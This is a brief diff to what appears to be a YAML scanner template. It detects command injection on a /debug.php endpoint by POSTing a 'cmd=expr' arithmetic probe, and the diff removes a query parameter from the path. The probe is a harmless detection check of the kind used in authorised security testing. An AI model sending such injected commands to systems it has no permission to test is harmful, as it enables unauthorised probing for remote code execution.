@@ -4,7 +4,7 @@ set:
   r2: randomInt(800000000, 1000000000)
 rules:
   - method: POST
-    path: /debug.php?_t=0.6552206544742862
+    path: /debug.php
     follow_redirects: false
     body: |
       cmd=expr%20{{r1}}%20%2b%20{{r2}}
